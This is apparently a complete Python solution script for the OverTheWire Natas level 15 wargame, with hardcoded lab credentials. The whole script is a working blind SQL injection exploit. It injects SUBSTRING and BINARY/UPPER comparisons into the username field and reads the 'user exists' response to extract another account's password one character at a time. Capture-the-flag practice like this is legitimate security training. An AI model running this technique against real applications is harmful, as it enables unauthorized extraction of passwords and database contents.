import requests

url = "http://natas15.natas.labs.overthewire.org/"
auth=("natas15","SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
characters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
           '0','1','2','3','4','5','6','7','8','9']
password = ""
for n in range(1,33):
    for i in characters:
        payload="natas16\" and SUBSTRING(password, "+str(n)+", 1) = "+"'"+i+"'"+" -- "
        user_search={"username" : payload}
        response = requests.post(url,data=user_search,auth=auth)
        if "This user exists." in response.text:
            payload="natas16\" and BINARY SUBSTRING(password, "+str(n)+", 1) = UPPER(SUBSTRING(password, "+str(n)+", 1)) -- "
            user_search={"username" : payload}
            response = requests.post(url,data=user_search,auth=auth)
            if "This user exists." in response.text:
                i=i.upper()
            password += i
            print(password)
            break